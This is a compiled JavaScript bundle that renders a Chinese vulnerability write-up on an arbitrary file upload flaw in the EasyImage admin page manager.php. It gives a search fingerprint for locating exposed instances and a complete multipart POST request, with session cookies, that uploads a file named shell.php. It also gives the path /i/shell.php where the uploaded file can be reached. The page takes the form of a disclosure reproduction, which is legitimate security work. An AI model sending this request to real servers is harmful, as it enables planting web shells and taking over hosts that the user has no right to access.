(window.webpackJsonp=window.webpackJsonp||[]).push([[466],{2095:function(a,n,s){a.exports=s.p+"assets/img/1678874513039-c454fc7f-e231-4417-b7a9-ebadfa12d0ba-20230406183127512.60c64acf.png"},2096:function(a,n,s){a.exports=s.p+"assets/img/1680344820983-7383f2b8-c760-4a7e-952f-6c4ff7617027.a8c659c5.png"},3225:function(a,n,s){"use strict";s.r(n);var t=s(64),e=Object(t.a)({},(function(){var a=this,n=a._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[n("h1",{attrs:{id:"easyimage-manager-php-后台任意文件上传漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#easyimage-manager-php-后台任意文件上传漏洞"}},[a._v("#")]),a._v(" EasyImage manager.php 后台任意文件上传漏洞")]),a._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),n("p",[a._v("EasyImage manager.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件到服务器获取服务器权限")]),a._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),n("a-checkbox",{attrs:{checked:""}},[a._v("EasyImage")]),n("br"),a._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),n("a-checkbox",{attrs:{checked:""}},[a._v('app="EasyImage-简单图床"')]),n("br"),a._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),n("p",[a._v("主页面")]),a._v(" "),n("p",[n("img",{attrs:{src:s(2095),alt:"img"}})]),a._v(" "),n("p",[a._v("登陆后台后发送POC (通过任意文件读取获取账号密码)")]),a._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[a._v('POST /admin/manager.php?p= HTTP/1.1\nHost: \nAccept: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\nCache-Control: no-cache\nContent-Length: 1622\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryEUCF9Yq83AkaO6sv\nCookie: Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680341989; auth=a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22tossone%22%3Bi%3A1%3Bs%3A32%3A%22590368bca375c2f8fe93df7d253481e8%22%3B%7D; Hm_lpvt_c790ac2bdc2f385757ecd0183206108d=1680342144; filemanager=sdeemhj3b9aeoretftrlijjh25\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36\n\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dzuuid"\n\n7e4fad9a-3545-4ed6-b655-b3e3a6b2978c\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dzchunkindex"\n\n0\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dztotalfilesize"\n\n583\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dzchunksize"\n\n10000000\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dztotalchunkcount"\n\n1\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="dzchunkbyteoffset"\n\n0\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="p"\n\n\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="fullpath"\n\nshell.php\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv\nContent-Disposition: form-data; name="file"; filename="shell.php"\nContent-Type: application/octet-stream\n\n234\n\n------WebKitFormBoundaryEUCF9Yq83AkaO6sv--\n')])]),a._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[a._v("1")]),n("br"),n("span",{staticClass:"line-number"},[a._v("2")]),n("br"),n("span",{staticClass:"line-number"},[a._v("3")]),n("br"),n("span",{staticClass:"line-number"},[a._v("4")]),n("br"),n("span",{staticClass:"line-number"},[a._v("5")]),n("br"),n("span",{staticClass:"line-number"},[a._v("6")]),n("br"),n("span",{staticClass:"line-number"},[a._v("7")]),n("br"),n("span",{staticClass:"line-number"},[a._v("8")]),n("br"),n("span",{staticClass:"line-number"},[a._v("9")]),n("br"),n("span",{staticClass:"line-number"},[a._v("10")]),n("br"),n("span",{staticClass:"line-number"},[a._v("11")]),n("br"),n("span",{staticClass:"line-number"},[a._v("12")]),n("br"),n("span",{staticClass:"line-number"},[a._v("13")]),n("br"),n("span",{staticClass:"line-number"},[a._v("14")]),n("br"),n("span",{staticClass:"line-number"},[a._v("15")]),n("br"),n("span",{staticClass:"line-number"},[a._v("16")]),n("br"),n("span",{staticClass:"line-number"},[a._v("17")]),n("br"),n("span",{staticClass:"line-number"},[a._v("18")]),n("br"),n("span",{staticClass:"line-number"},[a._v("19")]),n("br"),n("span",{staticClass:"line-number"},[a._v("20")]),n("br"),n("span",{staticClass:"line-number"},[a._v("21")]),n("br"),n("span",{staticClass:"line-number"},[a._v("22")]),n("br"),n("span",{staticClass:"line-number"},[a._v("23")]),n("br"),n("span",{staticClass:"line-number"},[a._v("24")]),n("br"),n("span",{staticClass:"line-number"},[a._v("25")]),n("br"),n("span",{staticClass:"line-number"},[a._v("26")]),n("br"),n("span",{staticClass:"line-number"},[a._v("27")]),n("br"),n("span",{staticClass:"line-number"},[a._v("28")]),n("br"),n("span",{staticClass:"line-number"},[a._v("29")]),n("br"),n("span",{staticClass:"line-number"},[a._v("30")]),n("br"),n("span",{staticClass:"line-number"},[a._v("31")]),n("br"),n("span",{staticClass:"line-number"},[a._v("32")]),n("br"),n("span",{staticClass:"line-number"},[a._v("33")]),n("br"),n("span",{staticClass:"line-number"},[a._v("34")]),n("br"),n("span",{staticClass:"line-number"},[a._v("35")]),n("br"),n("span",{staticClass:"line-number"},[a._v("36")]),n("br"),n("span",{staticClass:"line-number"},[a._v("37")]),n("br"),n("span",{staticClass:"line-number"},[a._v("38")]),n("br"),n("span",{staticClass:"line-number"},[a._v("39")]),n("br"),n("span",{staticClass:"line-number"},[a._v("40")]),n("br"),n("span",{staticClass:"line-number"},[a._v("41")]),n("br"),n("span",{staticClass:"line-number"},[a._v("42")]),n("br"),n("span",{staticClass:"line-number"},[a._v("43")]),n("br"),n("span",{staticClass:"line-number"},[a._v("44")]),n("br"),n("span",{staticClass:"line-number"},[a._v("45")]),n("br"),n("span",{staticClass:"line-number"},[a._v("46")]),n("br"),n("span",{staticClass:"line-number"},[a._v("47")]),n("br"),n("span",{staticClass:"line-number"},[a._v("48")]),n("br"),n("span",{staticClass:"line-number"},[a._v("49")]),n("br"),n("span",{staticClass:"line-number"},[a._v("50")]),n("br")])]),n("p",[n("img",{attrs:{src:s(2096),alt:"img"}})]),a._v(" "),n("p",[a._v("上传访问地址为")]),a._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[a._v("/i/shell.php\n")])]),a._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[a._v("1")]),n("br")])])],1)}),[],!1,null,null,null);n.default=e.exports}}]);